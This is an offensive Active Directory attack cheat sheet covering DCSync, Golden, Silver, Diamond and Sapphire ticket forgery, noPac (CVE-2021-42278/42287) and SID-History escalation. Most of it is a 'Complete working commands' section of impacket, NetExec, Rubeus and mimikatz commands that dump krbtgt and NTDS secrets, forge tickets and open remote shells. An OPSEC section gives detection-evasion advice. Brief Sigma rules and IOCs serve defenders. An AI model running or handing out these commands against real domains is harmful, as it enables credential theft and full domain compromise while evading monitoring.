# Ticket Forgery, DCSync & PAC Attacks

ATT&CK: T1558.001 (Golden Ticket), T1558.002 (Silver Ticket), T1003.006 (DCSync /
OS Credential Dumping: DCSync), T1558 (Steal/Forge Tickets), T1207 (Rogue Domain Controller),
T1134.005 (SID-History Injection). CWE-345 (Insufficient Verification of Data Authenticity),
CWE-269 (Improper Privilege Management), CWE-287 (Improper Authentication).

## Theory / Mechanism

- **DCSync**: with `DS-Replication-Get-Changes(-All)` rights, impersonate a DC and pull secrets via
  MS-DRSR `DRSGetNCChanges` — no code on the DC, no LSASS touch.
- **Golden Ticket**: forge a TGT signed with the `krbtgt` key → any user, any group, full domain.
- **Silver Ticket**: forge a service ticket (TGS) with a service account key → access one service,
  never touches the DC (no 4769).
- **Diamond/Sapphire**: instead of fully forging the PAC, request a *real* TGT and modify/swap the
  PAC (Diamond) or request a TGS for a privileged user via S4U and graft its PAC (Sapphire) → the PAC
  matches domain policy, evading "anomalous PAC" detections.
- **PAC**: signed structure in tickets carrying SIDs/groups. Spoofing its signature = full EoP.

## Modern 2024-2026 variants (verified)

- **PAC validation enforcement — CVE-2024-26248 & CVE-2024-29056 (Apr 2024, Enforced Oct 15 2024)**:
  fixed PAC-signature spoofing / cross-forest PAC bypass. Clients now do a Netlogon "Network Ticket
  Logon" to validate STs (`PacSignatureValidationLevel=3`, `CrossDomainFilteringLevel=4`). Bare PAC
  forgery on patched/enforced domains fails — forge against unpatched DCs or use Diamond/Sapphire.
- **noPac — CVE-2021-42278 + CVE-2021-42287 (still found unpatched)**: clear a machine account's
  trailing `$` (sAMAccountName spoof) so the KDC, on S4U2self, resolves it to a DC account → ST as DC.
- **AES over RC4**: forge tickets with `/aes256` keys (RC4-only Golden tickets stick out as Win11
  24H2 / Server 2025 deprecate NTLM/RC4). Match real lifetimes to dodge "ticket lifetime > policy".

## Complete working commands

### DCSync (cheapest domain-wide dump)
```bash
# Targeted (just krbtgt -> Golden later); minimal footprint
impacket-secretsdump -just-dc-user 'corp\krbtgt' corp.local/da:'Pass'@<DC_IP>
# Full NTDS
impacket-secretsdump -just-dc corp.local/da:'Pass'@<DC_IP>
nxc smb <DC_IP> -u da -p 'Pass' --ntds drsuapi
# mimikatz
# lsadump::dcsync /domain:corp.local /user:krbtgt
```

### noPac (CVE-2021-42278/42287) — user → DA
```bash
impacket-addcomputer -computer-name 'NOPAC$' -computer-pass 'Pass123!' -dc-ip <DC_IP> corp.local/user:'Pass'
# noPac.py / NetExec automates the rename+S4U:
nxc smb <DC_IP> -u user -p 'Pass' -M nopac
python3 noPac.py corp.local/user:'Pass' -dc-ip <DC_IP> --impersonate administrator -use-ldap -dump
```

### Golden Ticket (krbtgt AES key + domain SID)
```bash
# Grab AES256 key + SID
impacket-secretsdump -just-dc-user 'corp\krbtgt' corp.local/da:'Pass'@<DC_IP>     # note aes256
impacket-lookupsid corp.local/user:'Pass'@<DC_IP> | grep 'Domain SID'
# Forge with AES (quieter than /rc4), realistic groups + lifetime
impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid <S-1-5-21-...> -domain corp.local \
  -groups 512,513,518,519,520 -user-id 500 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@<DC_FQDN>
# Rubeus equivalent
Rubeus.exe golden /aes256:<KEY> /user:Administrator /domain:corp.local /sid:<SID> /ptt
```

### Silver Ticket (service key, no DC contact)
```bash
impacket-ticketer -aesKey <SVC_AES256> -domain-sid <SID> -domain corp.local \
  -spn cifs/srv01.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbexec -k -no-pass srv01.corp.local
```

### Diamond / Sapphire (PAC-aware, evades policy checks)
```bash
# Diamond: clone a real TGT, modify the PAC
Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:lowpriv /password:Pass /domain:corp.local \
  /dc:dc01.corp.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
# Sapphire: graft a privileged user's real PAC via S4U
impacket-ticketer -request -impersonate administrator -domain corp.local -domain-sid <SID> \
  -aesKey <KRBTGT_AES256> -user lowpriv -password 'Pass' fakeuser
```

### SID-History / cross-forest (child → parent Enterprise Admin)
```bash
mimikatz # lsadump::dcsync /domain:child.corp.local /user:child\krbtgt   # get child krbtgt
impacket-ticketer -aesKey <CHILD_KRBTGT_AES> -domain child.corp.local -domain-sid <CHILD_SID> \
  -extra-sid <PARENT_SID>-519 Administrator        # Enterprise Admins of parent in SID-History
# Trust-key path (inter-realm TGT):
mimikatz # lsadump::trust /patch    # extract trust key, forge inter-realm TGT to parent
```

## Detection

```yaml
title: DCSync from Non-DC Host
logsource: { product: windows, service: security }
detection:
  sel: { EventID: 4662, Properties|contains: '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' }  # DS-Replication-Get-Changes
  filter_dc: { SubjectUserName|endswith: '$' }       # legit DC machine accounts
  condition: sel and not filter_dc
level: critical
---
title: Golden/Forged TGT - Lifetime or Encryption Anomaly
logsource: { product: windows, service: security }
detection:
  rc4tgt: { EventID: 4768, TicketEncryptionType: '0x17' }   # RC4 TGT in AES domain
  condition: rc4tgt
level: high
```
IOCs: 4662 DRSUAPI replication GUID from a non-DC IP; 4769 referencing the `krbtgt` SPN; tickets with
lifetime exceeding domain policy; RC4 (0x17) TGT/TGS in an AES-capable domain; sAMAccountName of a
computer object momentarily lacking `$` (noPac); 4742 computer-account attribute resets.

## OPSEC

- Prefer **AES** keys for forgery and **match domain ticket lifetime** (default 10h/7d) — RC4 + long
  lifetimes are the classic Golden-ticket tell.
- Silver tickets never hit the DC (no 4769) — quietest for single-service access.
- Diamond/Sapphire produce policy-consistent PACs — favor them on monitored domains over raw Golden.
- DCSync only what you need (`-just-dc-user krbtgt`) rather than full NTDS to cut 4662 volume.
- On PAC-enforced (post-Oct 2024) domains, bare PAC forgery against patched DCs fails — validate
  patch level first; document any forged krbtgt ticket (rotate krbtgt twice to invalidate afterward).

## References
- Microsoft Support — "Manage PAC Validation changes related to CVE-2024-26248 and CVE-2024-29056"
- HackingArticles / The Hacker Recipes — sAMAccountName spoofing (noPac, CVE-2021-42278/42287)
- GhostPack/Rubeus — `golden`, `diamond`; SpecterOps "Diamond/Sapphire ticket" research
- impacket — `ticketer.py`, `secretsdump.py`, `lookupsid.py`
